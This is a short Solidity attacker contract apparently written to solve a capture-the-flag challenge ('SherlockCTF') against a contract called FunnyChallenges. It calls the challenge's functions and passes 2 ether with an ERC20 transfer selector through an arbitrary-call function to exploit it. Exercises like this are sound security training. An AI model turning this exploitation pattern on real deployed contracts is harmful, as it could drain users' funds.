pragma solidity 0.8.4;

import "./FunnyChallenges.sol";

contract ych18Attacker {

    FunnyChallenges instance;
    
    constructor(FunnyChallenges inst) payable {
        instance = inst;
        instance.DontGiveUp("SherlockCTF", " ");
    }

    function attack() public payable {
        require(msg.value == 2 ether);
        instance.func{value: msg.value}(address(instance), 0, hex"a9059cbb");
    }

    receive() external payable { 

    }

}